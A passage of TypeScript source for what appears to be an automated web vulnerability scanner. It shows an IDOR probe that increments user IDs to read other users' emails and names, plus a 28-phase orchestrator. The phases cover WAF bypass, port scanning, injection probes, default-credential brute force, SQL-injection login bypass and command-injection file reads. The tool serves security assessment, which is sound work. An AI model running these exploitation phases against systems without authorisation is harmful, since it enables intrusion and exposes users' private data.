    const urlIdMatches = [...(r.finalUrl.matchAll(/\/(\d+)(?:\/|$)/g))].map((m) => parseInt(m[1]!));
    const numericIds = [...bodyIdMatches, ...urlIdMatches].filter((id) => id > 0);
    if (numericIds.length === 0) continue;

    const myId = numericIds[0]!;
    const myEmail = r.body.match(/"email":\s*"([^"]+)"/)?.[1];
    const myName  = r.body.match(/"(?:name|username)":\s*"([^"]+)"/)?.[1];

    const testIds = [myId - 1, myId + 1, myId - 2, myId + 2].filter((id) => id > 0);

    for (const testId of testIds.slice(0, 2)) {
      if (!activeProbesAllowed()) break;
      const testUrls = [
        `${target.url.replace(/\/$/, "")}/api/user/${testId}`,
        `${authUrl}/${testId}`,
        `${authUrl}?id=${testId}`,
      ];
      for (const url of testUrls) {
        if (!activeProbesAllowed()) break;
        const idRes = await probe(url, { headers: { "Cookie": cookieHeader }, timeoutMs: 8_000 });
        if (!idRes || idRes.status === 404 || idRes.status === 403 || idRes.status === 401) continue;

        const testEmail = idRes.body.match(/"email":\s*"([^"]+)"/)?.[1];
        const testName  = idRes.body.match(/"(?:name|username)":\s*"([^"]+)"/)?.[1];
        const differentUser =
          (myEmail && testEmail && myEmail !== testEmail) ||
          (myName  && testName  && myName  !== testName);

        if (differentUser && idRes.status === 200) {
          findings.push({
            title: "IDOR — Cross-User Data Access via Direct Object Reference",
            severity: "high",
            verification: "verified",
            confidence: 90,
            cvss: 8.1,
            cve: null,
            description: `Insecure Direct Object Reference confirmed at ${url}. Using the captured low-privilege session, incrementing user ID ${myId} to ${testId} exposed data belonging to a different user. The server does not verify object ownership before returning data.`,
            evidence: `MY ID: ${myId} → email=${myEmail ?? "N/A"} name=${myName ?? "N/A"}\nACCESSED ID: ${testId} → email=${testEmail ?? "N/A"} name=${testName ?? "N/A"}\nURL: GET ${url} → HTTP ${idRes.status}\nCross-user data confirmed: identifiers differ`,
            remediation: "1. Check object ownership on every data access — never trust client-supplied IDs alone.\n2. Use non-sequential, cryptographically random UUIDs for user-facing object identifiers.\n3. Validate that the authenticated session user matches the requested object owner.\n4. Log and alert on sequential ID enumeration patterns.",
            compliance: { owasp: ["A01:2021 – Broken Access Control"], pci: ["7.2.1"], nist: ["AC-3"] },
          });
          await onLog(`[${ts()}] ⚠ HIGH: IDOR confirmed — accessed user ${testId} data with session for user ${myId}`);
          return findings;
        }
      }
    }
  }

  await onLog(`[${ts()}] [Phase 28] IDOR with captured session: no cross-user data access confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// MAIN ORCHESTRATOR
// ═══════════════════════════════════════════════════════════════════════════════

export async function scanTarget(
  value: string,
  assetType: string,
  scanType: ScanType,
  onLog: LogFn,
  policy: ScanPolicy = resolveScanPolicy("safe_active"),
  authHeaders?: Record<string, string>,
): Promise<ScanResult> {
  const target = normalizeTarget(value, assetType);
  if (!target) {
    await onLog(`[${ts()}] ERROR: Cannot normalise target "${value}" — skipping`);
    return { findings: [], wafBlocked: false };
  }

  return scanContext.run(
    {
      remaining: policy.requestBudget,
      exhaustedNotified: false,
      authHeaders,
      wafChallengeDetected: false,
      wafChallengeLogEmitted: false,
      activeProbeDepth: 0,
      onWafChallenge: () => onLog(`[${ts()}] WAF challenge page detected — active probes suspended; only passive/informational checks running.`),
    },
    async () => {
      const all: RealFinding[] = [];
      const add = (f: RealFinding[]) => { all.push(...f); };

  await onLog(`[${ts()}] ═══════════════════════════════════════`);
  await onLog(`[${ts()}] TARGET  : ${target.url}`);
  await onLog(`[${ts()}] HOST    : ${target.hostname}`);
  await onLog(`[${ts()}] SCAN    : FULL DEEP SCAN / PROFILE ${policy.profile.toUpperCase()}`);
  await onLog(`[${ts()}] POLICY  : ${policy.requestBudget} request budget · ${policy.timeoutMs}ms timeout · concurrency ${policy.maxConcurrency}`);
  await onLog(`[${ts()}] TOOLS   : nmap · dig · whois · openssl · fetch · crt.sh · ipinfo.io · Wayback`);
  if (authHeaders && Object.keys(authHeaders).length > 0) {
    await onLog(`[${ts()}] AUTH    : Authenticated scanning enabled (${Object.keys(authHeaders).join(", ")})`);
  } else {
    await onLog(`[${ts()}] AUTH    : Unauthenticated scan`);
  }
  await onLog(`[${ts()}] ═══════════════════════════════════════`);

  // ── Phase 1: WAF detection and bypass ─────────────────────────────────────
  await onLog(`[${ts()}] [Phase 1] WAF/CDN detection and bypass testing...`);
  const { findings: wafFindings, wafName } = await runActiveChecks(
    () => checkWafAndBypass(target, onLog),
    { findings: [], wafName: null },
  );
  add(wafFindings);

  // ── Phase 2: DNS enumeration ──────────────────────────────────────────────
  await onLog(`[${ts()}] [Phase 2] DNS enumeration (dig — A/AAAA/MX/TXT/NS/CAA/AXFR)...`);
  add(await checkDns(target.hostname, onLog));

  // ── Phase 3: IP geolocation & ASN ────────────────────────────────────────
  await onLog(`[${ts()}] [Phase 3] IP geolocation & ASN intelligence (ipinfo.io)...`);
  await getIpInfo(target.hostname, onLog);

  // ── Phase 4: WHOIS domain intelligence ───────────────────────────────────
  if (assetType !== "ip") {
    await onLog(`[${ts()}] [Phase 4] WHOIS domain intelligence...`);
    add(await checkWhois(target.hostname, onLog));
  }

  // ── Phase 5: Subdomain discovery + takeover check ─────────────────────────
  let discoveredSubs: string[] = [];
  if (assetType !== "ip") {
    await onLog(`[${ts()}] [Phase 5] Subdomain discovery (crt.sh + DNS brute force)...`);
    const { findings: subFindings, subs } = await discoverSubdomains(target.hostname, onLog);
    add(subFindings);
    discoveredSubs = subs;
    await onLog(`[${ts()}] Total subdomains in scope: ${subs.length}`);

    // Subdomain takeover check
    await onLog(`[${ts()}] [Phase 5b] Subdomain takeover detection...`);
    add(await runActiveChecks(() => checkSubdomainTakeover(discoveredSubs, onLog), []));
  }

  // ── Phase 6: Port scanning (nmap) ─────────────────────────────────────────
  await onLog(`[${ts()}] [Phase 6] Full port scanning with nmap (service version detection)...`);
  add(await runActiveChecks(() => checkPorts(target.hostname, "full", onLog), []));

  // ── Phase 7: TLS / SSL analysis ───────────────────────────────────────────
  if (target.isHttps) {
    await onLog(`[${ts()}] [Phase 7] TLS/SSL analysis (openssl + node:tls — certs, protocols, ciphers)...`);
    add(await checkTls(target.hostname, target.port, onLog));
  }

  // ── Phase 8: HTTP security headers ────────────────────────────────────────
  await onLog(`[${ts()}] [Phase 8] HTTP security header analysis (HSTS/CSP/CORS/cookies)...`);
  add(await checkHeaders(target, onLog));

  // ── Phase 9: Technology fingerprinting ────────────────────────────────────
  await onLog(`[${ts()}] [Phase 9] Technology fingerprinting...`);
  const { techs, findings: fpFindings } = await fingerprint(target, onLog);
  add(fpFindings);
  if (techs.length > 0) {
    await onLog(`[${ts()}] Stack detected: ${techs.map((t) => `${t.name} (${t.category})`).join(" · ")}`);
  }

  // ── Phase 10: Sensitive path discovery (deep mode always) ─────────────────
  await onLog(`[${ts()}] [Phase 10] Sensitive path discovery (deep mode — ${SENSITIVE_PATHS.length} paths)...`);
  add(await runActiveChecks(() => checkSensitivePaths(target, true, onLog), []));

  // ── Phase 11: Wayback Machine endpoint discovery ───────────────────────────
  await onLog(`[${ts()}] [Phase 11] Wayback Machine historical endpoint discovery...`);
  add(await checkWayback(target.hostname, onLog));

  // ── Phase 12: Web application vulnerability probes ────────────────────────
  await onLog(`[${ts()}] [Phase 12] Web app probes — SQLi (error+blind) · XSS · NoSQL · CMDi · redirects · methods...`);
  add(await runActiveChecks(() => checkWebApp(target, onLog), []));

  // ── Phase 13: API surface discovery ──────────────────────────────────────
  await onLog(`[${ts()}] [Phase 13] API surface — GraphQL · Swagger · Spring Actuator · Telescope...`);
  add(await runActiveChecks(() => checkApiSurface(target, onLog), []));

  // ── Phase 14: Host header injection ──────────────────────────────────────
  await onLog(`[${ts()}] [Phase 14] Host header injection / password-reset poisoning...`);
  add(await runActiveChecks(() => checkHostHeaderInjection(target, onLog), []));

  // ── Phase 15: CRLF injection ──────────────────────────────────────────────
  await onLog(`[${ts()}] [Phase 15] CRLF injection / HTTP response splitting...`);
  add(await runActiveChecks(() => checkCrlfInjection(target, onLog), []));

  // ── Phase 16: Path traversal ──────────────────────────────────────────────
  await onLog(`[${ts()}] [Phase 16] Path traversal / directory traversal...`);
  add(await runActiveChecks(() => checkPathTraversal(target, onLog), []));

  // ── Phase 17: JWT weakness detection ─────────────────────────────────────
  await onLog(`[${ts()}] [Phase 17] JWT algorithm, secret weakness, and advanced attack suite...`);
  add(await runActiveChecks(() => checkJwtWeaknesses(target, onLog), []));

  // ── Phase 18: IDOR / Access Control ──────────────────────────────────────
  await onLog(`[${ts()}] [Phase 18] IDOR / Broken Object-Level Access Control + privilege escalation headers...`);
  add(await runActiveChecks(() => checkIdorAndBola(target, onLog), []));

  // ── Phase 19: HTTP Request Smuggling ─────────────────────────────────────
  await onLog(`[${ts()}] [Phase 19] HTTP request smuggling — CL.TE · TE.CL · obfuscated TE...`);
  add(await runActiveChecks(() => checkHttpRequestSmuggling(target, onLog), []));

  // ── Phase 20: Log4Shell / Spring4Shell surface ────────────────────────────
  await onLog(`[${ts()}] [Phase 20] Log4Shell (CVE-2021-44228) / Spring4Shell (CVE-2022-22965) surface...`);
  add(await runActiveChecks(() => checkLog4ShellSurface(target, onLog), []));

  // ── Phase 21: Rate limiting on auth endpoints ─────────────────────────────
  await onLog(`[${ts()}] [Phase 21] Rate limiting / brute-force protection check...`);
  add(await runActiveChecks(() => checkRateLimiting(target, onLog), []));

  // ── Phase 22: Advanced vulnerability probes ───────────────────────────────
  {
    const { checkSSTI, checkXXE, checkSSRF, checkDeserialization, checkCommandInjection, checkNoSqlInjection, lookupCvesForTechs } = await import("./vuln-probes");
    await onLog(`[${ts()}] [Phase 22] Advanced probes — SSTI · XXE · SSRF · Deserialization · CMDi · NoSQL...`);
    const [sstiF, xxeF, ssrfF, deserF, cmdF, nosqlF] = await Promise.all([
      runActiveChecks(() => checkSSTI(target, onLog), []),
      runActiveChecks(() => checkXXE(target, onLog), []),
      runActiveChecks(() => checkSSRF(target, onLog), []),
      runActiveChecks(() => checkDeserialization(target, onLog), []),
      runActiveChecks(() => checkCommandInjection(target, onLog), []),
      runActiveChecks(() => checkNoSqlInjection(target, onLog), []),
    ]);
    add(sstiF); add(xxeF); add(ssrfF); add(deserF); add(cmdF); add(nosqlF);

    // ── Phase 23: CVE lookup ─────────────────────────────────────────────────
    await onLog(`[${ts()}] [Phase 23] CVE database lookup (NVD) for detected technology versions...`);
    const { techs: detectedTechs } = await fingerprint(target, async () => {});
    add(await lookupCvesForTechs(detectedTechs, onLog));
  }

  // ── Phase 24: Open registration exploitation ──────────────────────────────
  add(await runActiveChecks(() => checkOpenRegistration(target, onLog), []));

  // ── Phase 25: Default credential brute-force ──────────────────────────────
  add(await runActiveChecks(() => checkDefaultCredentials(target, onLog), []));

  // ── Phase 26: SQL injection authentication bypass ─────────────────────────
  add(await runActiveChecks(() => checkSqliAuthBypass(target, onLog), []));

  // ── Phase 27: Enhanced command injection with file-read canary ────────────
  {
    const { checkCommandInjectionDeep } = await import("./vuln-probes");
    await onLog(`[${ts()}] [Phase 27] Enhanced command injection — canary execution + file-read exploitation...`);
    add(await runActiveChecks(() => checkCommandInjectionDeep(target, onLog), []));
  }

  // ── Phase 28: IDOR / BOLA with captured session (from Phases 24-26) ───────
  add(await runActiveChecks(() => checkIdorWithCapturedSession(target, onLog), []));

  suppressWafSensitiveFindings(all);
  downgradeWafChallengeFindings(all);

  // ── Compliance mapping ────────────────────────────────────────────────────
  applyComplianceMapping(all);

  // ── Summary ───────────────────────────────────────────────────────────────
  const reportable = all.filter((f) => f.cvss > 0 || f.severity !== "low");
  const bySeverity = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const f of reportable) {
    if (f.severity in bySeverity) bySeverity[f.severity as keyof typeof bySeverity]++;
  }

  // Risk grade (A–F based on highest severity and count)
  const riskGrade = bySeverity.critical > 0 ? "F"
    : bySeverity.high >= 3 ? "D"
    : bySeverity.high >= 1 ? "C"
    : bySeverity.medium >= 3 ? "C"
    : bySeverity.medium >= 1 ? "B"
    : reportable.length === 0 ? "A"
    : "B";

  const top3 = reportable
    .slice()
    .sort((a, b) => (b.cvss ?? 0) - (a.cvss ?? 0))
    .slice(0, 3)
    .map(f => `  • ${f.title} (CVSS ${f.cvss}, ${f.severity.toUpperCase()})`)
    .join("\n");

      await onLog(`[${ts()}] ═══════════════════════════════════════`);
      await onLog(`[${ts()}] SCAN COMPLETE — EXECUTIVE SUMMARY`);
      await onLog(`[${ts()}] Risk Grade : ${riskGrade}`);
      await onLog(`[${ts()}] Total findings : ${reportable.length} (C:${bySeverity.critical} H:${bySeverity.high} M:${bySeverity.medium} L:${bySeverity.low})`);
      await onLog(`[${ts()}] Requests used: ${policy.requestBudget - (remainingScanRequests() ?? 0)}/${policy.requestBudget}`);
      if (top3) {
        await onLog(`[${ts()}] Top findings by CVSS:`);
        await onLog(top3);
      }
      await onLog(`[${ts()}] Compliance: OWASP Top 10 · PCI DSS v4.0 · NIST 800-53 mapped to findings`);
      await onLog(`[${ts()}] ═══════════════════════════════════════`);

      return { findings: reportable, wafBlocked: isWafChallengeDetected() };
    },
  );
}
